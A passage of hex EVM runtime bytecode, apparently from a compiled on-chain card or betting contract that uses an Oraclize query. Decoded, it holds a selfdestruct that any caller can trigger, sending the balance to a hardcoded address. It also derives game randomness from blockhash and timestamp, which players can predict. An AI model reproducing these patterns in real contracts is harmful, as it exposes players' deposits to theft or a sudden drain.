0280838360005b838110156103175780820151818401526020810190506102fc565b5050505090500192600101926102dd565b9250505094505050505060405180910390f35b34801561034757600080fd5b50610350610e7a565b604051808060200180602001806020018060200186815260200185810385528a818151815260200191508051906020019080838360005b838110156103a2578082015181840152602081019050610387565b50505050905090810190601f1680156103cf5780820380516001836020036101000a031916815260200191505b50858103845289818151815260200191508051906020019060200280838360005b8381101561040b5780820151818401526020810190506103f0565b50505050905001858103835288818151815260200191508051906020019060200280838360005b8381101561044d578082015181840152602081019050610432565b50505050905001858103825287818151815260200191508051906020019060200280838360005b8381101561048f578082015181840152602081019050610474565b50505050905001995050505050505050505060405180910390f35b6104d6600480360360208110156104c057600080fd5b81019080803590602001909291905050506111b5565b005b6104e061121b565b005b3480156104ee57600080fd5b506104f7611349565b604051808781526020018681526020018581526020018481526020018373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001828152602001965050505050505060405180910390f35b34801561056857600080fd5b506105956004803603602081101561057f57600080fd5b8101908080359060200190929190505050611393565b005b3480156105a357600080fd5b506105ac6113f9565b6040518082815260200191505060405180910390f35b3480156105ce57600080fd5b506105d76113ff565b6040518082815260200191505060405180910390f35b6105f5611465565b005b34801561060357600080fd5b5061060c611576565b604051808060200180602001838103835285818151815260200191508051906020019080838360005b83811015610650578082015181840152602081019050610635565b50505050905090810190601f16801561067d5780820380516001836020036101000a031916815260200191505b508381038252848181518152602001915080516000925b818410156106df57828490602001906020020151600760200280838360005b838110156106ce5780820151818401526020810190506106b3565b505050509050019260010192610694565b9250505094505050505060405180910390f35b61071e6004803603602081101561070857600080fd5b8101908080359060200190929190505050611af3565b005b34801561072c57600080fd5b50610735611cbd565b604051808060200180602001838103835285818151815260200191508051906020019080838360005b8381101561077957808201518184015260208101905061075e565b50505050905090810190601f1680156107a65780820380516001836020036101000a031916815260200191505b508381038252848181518152602001915080516000925b8184101561080857828490602001906020020151600760200280838360005b838110156107f75780820151818401526020810190506107dc565b5050505090500192600101926107bd565b9250505094505050505060405180910390f35b610823611fec565b604051808260ff1660ff16815260200191505060405180910390f35b34801561084b57600080fd5b5061085461209d565b005b610a3e6004803603608081101561086c57600080fd5b810190808035906020019064010000000081111561088957600080fd5b82018360208201111561089b57600080fd5b803590602001918460208302840111640100000000831117156108bd57600080fd5b919080806020026020016040519081016040528093929190818152602001838360200280828437600081840152601f19601f8201169050808301925050505050505091929192908035906020019064010000000081111561091d57600080fd5b82018360208201111561092f57600080fd5b8035906020019184602083028401116401000000008311171561095157600080fd5b919080806020026020016040519081016040528093929190818152602001838360200280828437600081840152601f19601f820116905080830192505050505050509192919290803590602001906401000000008111156109b157600080fd5b8201836020820111156109c357600080fd5b803590602001918460208302840111640100000000831117156109e557600080fd5b919080806020026020016040519081016040528093929190818152602001838360200280828437600081840152601f19601f820116905080830192505050505050509192919290803590602001909291905050506120ca565b6040518082815260200191505060405180910390f35b610a5c612590565b005b600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141515610aba57600080fd5b8073ffffffffffffffffffffffffffffffffffffffff166108fc839081150290604051600060405180830381858888f19350505050158015610b00573d6000803e3d6000fd5b503073ffffffffffffffffffffffffffffffffffffffff163160028190555060646001543073ffffffffffffffffffffffffffffffffffffffff163102811515610b4657fe5b046000819055505050565b6060600e60008381526020019081526020016000208054600181600116156101000203166002900480601f016020809104026020016040519081016040528092919081815260200182805460018160011615610100020316600290048015610bfa5780601f10610bcf57610100808354040283529160200191610bfa565b820191906000526020600020905b815481529060010190602001808311610bdd57829003601f168201915b50505050509050919050565b6060806000600a60008581526020019081526020016000205490506032811115610c2f57603290505b606081604051908082528060200260200182016040528015610c6b57816020015b610c58613b70565b815260200190600190039081610c505790505b509050606060405180602001604052806000815250905060008090505b83811015610e6b57600960008881526020019081526020016000206000828152602001908152602001600020600780602002604051908101604052809291908260078015610ceb576020028201915b815481526020019060010190808311610cd7575b50505050508382815181101515610cfe57fe5b906020019060200201819052506001600c6000898152602001908152602001600020541415610d595760038382815181101515610d3757fe5b906020019060200201516005600781101515610d4f57fe5b6020020181815250505b6060600e60008981526020019081526020016000208054600181600116156101000203166002900480601f016020809104026020016040519081016040528092919081815260200182805460018160011615610100020316600290048015610e025780601f10610dd757610100808354040283529160200191610e02565b820191906000526020600020905b815481529060010190602001808311610de557829003601f168201915b505050505090506000821415610e1a57809250610e5d565b610e5a836040518060400160405280600181526020017f3b000000000000000000000000000000000000000000000000000000000000008152508361263a565b92505b508080600101915050610c88565b50808294509450505050915091565b606080606080600080600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020805490509050600081111515610ed757600080fd5b6000603290506032821015610eea578190505b606081604051908082528060200260200182016040528015610f1b5781602001602082028038833980820191505090505b509050606082604051908082528060200260200182016040528015610f4f5781602001602082028038833980820191505090505b509050606083604051908082528060200260200182016040528015610f835781602001602082028038833980820191505090505b5090506060604051806020016040528060008152509050600080600090505b8681101561119757600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600182890303815481101515610ffb57fe5b9060005260206000200154915081868281518110151561101757fe5b9060200190602002018181525050600b600083815260200190815260200160002054858281518110151561104757fe5b9060200190602002018181525050600c600083815260200190815260200160002054848281518110151561107757fe5b90602001906020020181815250506060600e60008481526020019081526020016000208054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561112e5780601f106111035761010080835404028352916020019161112e565b820191906000526020600020905b81548152906001019060200180831161111157829003601f168201915b50505050509050600082141561114657809350611189565b611186846040518060400160405280600181526020017f3b000000000000000000000000000000000000000000000000000000000000008152508361263a565b93505b508080600101915050610fa2565b5081858585429b509b509b509b509b50505050505050509091929394565b600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561121157600080fd5b8060078190555050565b6000600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208054905090506000603290506032821015611275578190505b600080600080600090505b8481101561134157600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206001828703038154811015156112d957fe5b90600052602060002001549150600c6000838152602001908152602001600020549350600b60008381526020019081526020016000205492506000841480156113255750610258834203115b156113345761133382612670565b5b8080600101915050611280565b505050505050565b6000806000806000806000549550600354945060025493506004549250600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169150909192939495565b600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156113ef57600080fd5b8060048190555050565b60025481565b6000600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561145d57600080fd5b600754905090565b6000600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002080549050905060006032905060328210156114bf578190505b60008060008090505b8381101561156f57600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060018286030381548110151561152157fe5b90600052602060002001549150600c600083815260200190815260200160002054925060008314806115535750600283145b156115625761156182612910565b5b80806001019150506114c8565b5050505050565b6060806000600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208054905090506000811115156115cf57600080fd5b600080600080600090505b8481101561167a576001818603039150600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208281548110151561163657fe5b90600052602060002001549250600a60008481526020019081526020016000205484019350836064101561166d576064935061167a565b80806001019150506115da565b506060836040519080825280602002602001820160405280156116b757816020015b6116a4613b70565b81526020019060019003908161169c5790505b5090506060846040519080825280602002602001820160405280156116eb5781602001602082028038833980820191505090505b509050606060405180602001604052806000815250905060008090506000806000905060008090505b8a811015611ade576001818c03039750600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208881548110151561177057fe5b90600052602060002001549850600a60008a815260200190815260200160002054925060008090505b83811015611ac5578a831015611aaf578987848151811015156117b857fe5b90602001906020020181815250506060600e60008c81526020019081526020016000208054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561186f5780601f106118445761010080835404028352916020019161186f565b820191906000526020600020905b81548152906001019060200180831161185257829003601f168201915b505050505090506000841415611887578096506118ca565b6118c7876040518060400160405280600181526020017f3b000000000000000000000000000000000000000000000000000000000000008152508361263a565b96505b600960008c81526020019081526020016000206000838152602001908152602001600020600780602002604051908101604052809291908260078015611925576020028201915b815481526020019060010190808311611911575b5050505050898581518110151561193857fe5b906020019060200201819052506001600c60008d8152602001908152602001600020541415611997576003898581518110151561197157fe5b90602001906020020151600560078110151561198957fe5b602002018181525050611aa1565b6002600c60008d8152602001908152602001600020541415611a1d57600289858151811015156119c357fe5b9060200190602002015160056007811015156119db57fe5b60200201511415611a1857600489858151811015156119f657fe5b906020019060200201516005600781101515611a0e57fe5b6020020181815250505b611aa0565b6003600c60008d8152602001908152602001600020541415611a9f5760028985815181101515611a4957fe5b906020019060200201516005600781101515611a6157fe5b60200201511415611a9e5760058985815181101515611a7c57fe5b906020019060200201516005600781101515611a9457fe5b6020020181815250505b5b5b5b838060010194505050611ab8565b60019450611ac5565b8080600101915050611799565b508315611ad157611ade565b8080600101915050611714565b5083869b509b50505050505050505050509091565b6000600c6000838152602001908152602001600020549050600281141515611b1a57600080fd5b60008090506000600a60008581526020019081526020016000205490506000600f600086815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905060008090505b82811015611bff5760026009600088815260200190815260200160002060008381526020019081526020016000206005600781101515611bb157fe5b01541415611bf2576009600087815260200190815260200160002060008281526020019081526020016000206006600781101515611beb57fe5b0154840193505b8080600101915050611b75565b506000831115611c51578073ffffffffffffffffffffffffffffffffffffffff166108fc849081150290604051600060405180830381858888f19350505050158015611c4f573d6000803e3d6000fd5b505b6003600c6000878152602001908152602001600020819055503073ffffffffffffffffffffffffffffffffffffffff163160028190555060646001543073ffffffffffffffffffffffffffffffffffffffff163102811515611caf57fe5b046000819055505050505050565b6060806000600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020805490509050600081111515611d1657600080fd5b60006001820390506000600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002082815481101515611d6c57fe5b906000526020600020015490506000600a60008381526020019081526020016000205490506032811115611d9f57603290505b606081604051908082528060200260200182016040528015611ddb57816020015b611dc8613b70565b815260200190600190039081611dc05790505b509050606060405180602001604052806000815250905060008090505b83811015611fdb576060600e60008781526020019081526020016000208054600181600116156101000203166002900480601f016020809104026020016040519081016040528092919081815260200182805460018160011615610100020316600290048015611ea95780601f10611e7e57610100808354040283529160200191611ea9565b820191906000526020600020905b815481529060010190602001808311611e8c57829003601f168201915b505050505090506000821415611ec157809250611f04565b611f01836040518060400160405280600181526020017f3b000000000000000000000000000000000000000000000000000000000000008152508361263a565b92505b600960008781526020019081526020016000206000838152602001908152602001600020600780602002604051908101604052809291908260078015611f5f576020028201915b815481526020019060010190808311611f4b575b50505050508483815181101515611f7257fe5b906020019060200201819052506001600c6000888152602001908152602001600020541415611fcd5760038483815181101515611fab57fe5b906020019060200201516005600781101515611fc357fe5b6020020181815250505b508080600101915050611df8565b508082975097505050505050509091565b6000600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561204a57600080fd5b3073ffffffffffffffffffffffffffffffffffffffff163160028190555060646001543073ffffffffffffffffffffffffffffffffffffffff16310281151561208f57fe5b046000819055506001905090565b738948e4b00deb0a5adb909f4dc5789d20d0851d7173ffffffffffffffffffffffffffffffffffffffff16ff5b600060016004541415156120dd57600080fd5b600085511115156120ed57600080fd5b6000821115156120fc57600080fd5b600354341015151561210d57600080fd5b61211a8585858534612ca7565b60006001430340426007546040516020018084815260200183815260200182815260200193505050506040516020818303038152906040528051906020012090507fd236fd58fd44deb7eda9b265c67a35dbe57eb585b61cd9b657cda55ce2dd748481604051808060200183815260200182810382526035815260200180613d4d603591396040019250505060405180910390a16121b6613b92565b600080905060008090505b8851811015612335576006600081548092919060010191905055506006548360006007811015156121ee57fe5b602002018181525050888181518110151561220557fe5b9060200190602002015183600160078110151561221e57fe5b602002018181525050868181518110151561223557fe5b9060200190602002015183600260078110151561224e57fe5b60200201818152505085888281518110151561226657fe5b906020019060200201510283600360078110151561228057fe5b60200201818152505085888281518110151561229857fe5b906020019060200201510282019150428360046007811015156122b757fe5b60200201818152505060008360056007811015156122d157fe5b60200201818152505060008360066007811015156122eb57fe5b60200201818152505082600960008681526020019081526020016000206000838152602001908152602001600020906007612327929190613bb4565b5080806001019150506121c1565b5080341015151561234557600080fd5b42600b6000858152602001908152602001600020819055508751600a60008581526020019081526020016000208190555033600f600085815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506123d0613bf4565b60405180608001604052806000815260200160008152602001600081526020016000815250905080600d6000868152602001908152602001600020906004612419929190613c16565b506040518060400160405280600781526020017f302c302c302c3000000000000000000000000000000000000000000000000000815250600e60008681526020019081526020016000209080519060200190612476929190613c56565b506000600c6000868152602001908152602001600020819055506000600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002080548091906001016124e39190613cd6565b905084600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208281548110151561253257fe5b90600052602060002001819055507fac038f3304801eaaf8be5e1857433a1cd22f8b6384720ccb25c1f291f7416784856040518082815260200191505060405180910390a161258085612ea7565b8495505050505050949350505050565b600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156125ec57600080fd5b3073ffffffffffffffffffffffffffffffffffffffff163160028190555060646001543073ffffffffffffffffffffffffffffffffffffffff16310281151561263157fe5b04600081905550565b60606126678484846040518060200160405280600081525060405180602001604052806000815250613398565b90509392505050565b6000600c600083815260200190815260200160002054905060008114151561269757600080fd5b61269f613bf4565b600d60008481526020019081526020016000206004806020026040519081016040528092919082600480156126e9576020028201915b8154815260200190600101908083116126d5575b50505050509050600081600060048110151561270157fe5b602002015114806127255750600081600160048110151561271e57fe5b6020020151145b806127435750600081600260048110151561273c57fe5b6020020151145b806127615750600081600360048110151561275a57fe5b6020020151145b151561276c57600080fd5b60008090506000600a60008681526020019081526020016000205490506000600f600087815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905060008090505b82811015612851576000600960008981526020019081526020016000206000838152602001908152602001600020600560078110151561280357fe5b0154141561284457600960008881526020019081526020016000206000828152602001908152602001600020600360078110151561283d57fe5b0154840193505b80806001019150506127c7565b5060008311156128a3578073ffffffffffffffffffffffffffffffffffffffff166108fc849081150290604051600060405180830381858888f193505050501580156128a1573d6000803e3d6000fd5b505b3073ffffffffffffffffffffffffffffffffffffffff163160028190555060646001543073ffffffffffffffffffffffffffffffffffffffff1631028115156128e857fe5b046000819055506001600c600088815260200190815260200160002081905550505050505050565b6000600c600083815260200190815260200160002054905060008114806129375750600281145b151561294257600080fd5b61294a613bf4565b600d6000848152602001908152602001600020600480602002604051908101604052809291908260048015612994576020028201915b815481526020019060010190808311612980575b5050505050905060008160006004811015156129ac57fe5b60200201511115156129bd57600080fd5b6000600a6000858152602001908152602001600020549050600080600f600087815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905060008090505b83811015612b1c576000861415612acc5760006009600089815260200190815260200160002060008381526020019081526020016000206005600781101515612a5957fe5b01541415612ac757612a8e60096000898152602001908152602001600020600083815260200190815260200160002086613678565b6009600088815260200190815260200160002060008281526020019081526020016000206006600781101515612ac057fe5b0154830192505b612b0f565b6002861415612b0e576009600088815260200190815260200160002060008281526020019081526020016000206006600781101515612b0757fe5b0154830192505b5b8080600101915050612a14565b506002600c6000888152602001908152602001600020819055506000821115612c39573073ffffffffffffffffffffffffffffffffffffffff1631821015612bc3578073ffffffffffffffffffffffffffffffffffffffff166108fc839081150290604051600060405180830381858888f19350505050158015612ba4573d6000803e3d6000fd5b506003600c600088815260200190815260200160002081905550612c34565b7fd236fd58fd44deb7eda9b265c67a35dbe57eb585b61cd9b657cda55ce2dd7484866040518080602001838152602001828103825260108152602001807f73656e7420626f756e73206661696c2e000000000000000000000000000000008152506020019250505060405180910390a15b612c53565b6003600c6000888152602001908152602001600020819055505b3073ffffffffffffffffffffffffffffffffffffffff163160028190555060646001543073ffffffffffffffffffffffffffffffffffffffff163102811515612c9857fe5b04600081905550505050505050565b600080905060008090506000809050600080600090505b8951811015612e6a5760018a82815181101515612cd757fe5b9060200190602002015110158015612d07575060038a82815181101515612cfa57fe5b9060200190602002015111155b15612d2f57868982815181101515612d1b57fe5b906020019060200201510285019450612d34565b600080fd5b60018a82815181101515612d4457fe5b906020019060200201511480612d71575060038a82815181101515612d6557fe5b90602001906020020151145b15612df757612d988a82815181101515612d8757fe5b9060200190602002015160006139f9565b9150600a82888b84815181101515612dac57fe5b906020019060200201510202811515612dc157fe5b0484019350600a82888b84815181101515612dd857fe5b906020019060200201510202811515612ded57fe5b0483019250612e5d565b60028a82815181101515612e0757fe5b906020019060200201511415612e5c57612e398a82815181101515612e2857fe5b9060200190602002015160006139f9565b915081878a83815181101515612e4b57fe5b906020019060200201510202830192505b5b8080600101915050612cbe565b600084905080841115612e7b578390505b858710151515612e8a57600080fd5b60005481101515612e9a57600080fd5b5050505050505050505050565b6001600a6000838152602001908152602001600020541015612ec857600080fd5b612ed0613bf4565b604051806080016040528060008152602001600081526020016000815260200160008152509050600060014303404233600754604051602001808581526020018481526020018373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1660601b81526014018281526020019450505050506040516020818303038152906040528051906020012090506103e88160001c811515612f7f57fe5b0660075401600781905550600160348260001c811515612f9b57fe5b0601826000600481101515612fac57fe5b6020020181815250506060612fd2600160348460001c811515612fcb57fe5b0601613a36565b9050600060014303404233600754604051602001808581526020018481526020018373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1660601b81526014018281526020019450505050506040516020818303038152906040528051906020012090506103e88160001c81151561305c57fe5b0660075401600781905550600160348260001c81151561307857fe5b060184600160048110151561308957fe5b60200201818152505060606130af600160348460001c8115156130a857fe5b0601613a36565b9050600060014303404233600754604051602001808581526020018481526020018373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1660601b81526014018281526020019450505050506040516020818303038152906040528051906020012090506103e88160001c81151561313957fe5b0660075401600781905550600160348260001c81151561315557fe5b060186600260048110151561316657fe5b602002018181525050606061318c600160348460001c81151561318557fe5b0601613a36565b9050600060014303404233600754604051602001808581526020018481526020018373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1660601b81526014018281526020019450505050506040516020818303038152906040528051906020012090506103e88160001c81151561321657fe5b0660075401600781905550600160348260001c81151561323257fe5b060188600360048110151561324357fe5b6020020181815250506060613269600160348460001c81151561326257fe5b0601613a36565b905088600d60008c815260200190815260200160002090600461328d929190613c16565b506060604051806020016040528060008152509050613319886040518060400160405280600181526020017f2c00000000000000000000000000000000000000000000000000000000000000815250886040518060400160405280600181526020017f2c0000000000000000000000000000000000000000000000000000000000000081525088613398565b905061335b816040518060400160405280600181526020017f2c000000000000000000000000000000000000000000000000000000000000008152508461263a565b600e60008d81526020019081526020016000209080519060200190613381929190613c56565b5061338b8b612910565b5050505050505050505050565b6060808690506060869050606086905060608690506060869050606081518351855187518951010101016040519080825280601f01601f1916602001820160405280156133f45781602001600182028038833980820191505090505b509050606081905060008090506000809050600090505b885181101561347f57888181518110151561342257fe5b90602001015160f81c60f81b838380600101945081518110151561344257fe5b9060200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350808060010191505061340b565b600090505b87518110156134f857878181518110151561349b57fe5b90602001015160f81c60f81b83838060010194508151811015156134bb57fe5b9060200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053508080600101915050613484565b600090505b865181101561357157868181518110151561351457fe5b90602001015160f81c60f81b838380600101945081518110151561353457fe5b9060200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a90535080806001019150506134fd565b600090505b85518110156135ea57858181518110151561358d57fe5b90602001015160f81c60f81b83838060010194508151811015156135ad57fe5b9060200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053508080600101915050613576565b600090505b845181101561366357848181518110151561360657fe5b90602001015160f81c60f81b838380600101945081518110151561362657fe5b9060200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a90535080806001019150506135ef565b82995050505050505050505095945050505050565b6000806000600d84600060048110151561368e57fe5b602002015181151561369c57fe5b06146136c757600d8360006004811015156136b357fe5b60200201518115156136c157fe5b066136ca565b600d5b9050600080600d8560016004811015156136e057fe5b60200201518115156136ee57fe5b061461371957600d84600160048110151561370557fe5b602002015181151561371357fe5b0661371c565b600d5b9050600080600d86600260048110151561373257fe5b602002015181151561374057fe5b061461376b57600d85600260048110151561375757fe5b602002015181151561376557fe5b0661376e565b600d5b9050600080600d87600360048110151561378457fe5b602002015181151561379257fe5b06146137bd57600d8660036004811015156137a957fe5b60200201518115156137b757fe5b066137c0565b600d5b90506000828501905060008285019050600a828115156137dc57fe5b069150600a818115156137eb57fe5b06905060018960016007811015156137ff57fe5b01541415613896578082111561387a57600289600560078110151561382057fe5b018190555061384089600160078110151561383757fe5b015460006139f9565b9650600a878a600360078110151561385457fe5b01540281151561386057fe5b0489600660078110151561387057fe5b0181905550613891565b600189600560078110151561388b57fe5b01819055505b6139ee565b60028960016007811015156138a757fe5b0154141561393257808214156139165760028960056007811015156138c857fe5b01819055506138e88960016007811015156138df57fe5b015460006139f9565b9650868960036007811015156138fa57fe5b01540289600660078110151561390c57fe5b018190555061392d565b600189600560078110151561392757fe5b01819055505b6139ed565b600389600160078110151561394357fe5b015414156139ec57600189600560078110151561395c57fe5b0181905550808210156139d457600289600560078110151561397a57fe5b018190555061399a89600160078110151561399157fe5b015460006139f9565b9650600a878a60036007811015156139ae57fe5b0154028115156139ba57fe5b048960066007811015156139ca57fe5b01819055506139eb565b60018960056007811015156139e557fe5b01819055505b5b5b5b505050505050505050565b600080600090506001841480613a0f5750600384145b15613a1d5760139050613a2c565b6002841415613a2b57600990505b5b8091505092915050565b60606000821415613a7e576040518060400160405280600181526020017f30000000000000000000000000000000000000000000000000000000000000008152509050613b6b565b600082905060005b600082141515613aac578080600101915050600a82811515613aa457fe5b049150613a86565b6060816040519080825280601f01601f191660200182016040528015613ae15781602001600182028038833980820191505090505b50905060006001830390505b600086141515613b6357600a86811515613b0357fe5b0660300160f81b828280600190039350815181101515613b1f57fe5b9060200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350600a86811515613b5b57fe5b049550613aed565b819450505050505b919050565b6040518060e00160405280600790602082028038833980820191505090505090565b6040518060e00160405280600790602082028038833980820191505090505090565b8260078101928215613be3579160200282015b82811115613be2578251825591602001919060010190613bc7565b5b509050613bf09190613d02565b5090565b6040518060800160405280600490602082028038833980820191505090505090565b8260048101928215613c45579160200282015b82811115613c44578251825591602001919060010190613c29565b5b509050613c529190613d02565b5090565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f10613c9757805160ff1916838001178555613cc5565b82800160010185558215613cc5579182015b82811115613cc4578251825591602001919060010190613ca9565b5b509050613cd29190613d02565b5090565b815481835581811115613cfd57818360005260206000209182019101613cfc9190613d27565b5b505050565b613d2491905b80821115613d20576000816000905550600101613d08565b5090565b90565b613d4991905b80821115613d45576000816000905550600101613d2d565b5090565b9056fe4f7261636c697a65207175657279207761732073656e742c207374616e64696e6720627920666f722074686520616e737765722e2ea165627a7a72305820a8913d84b526f85fda44310e6dd7fd82ad72eea3b1d16260a8d57d07502645620029"
}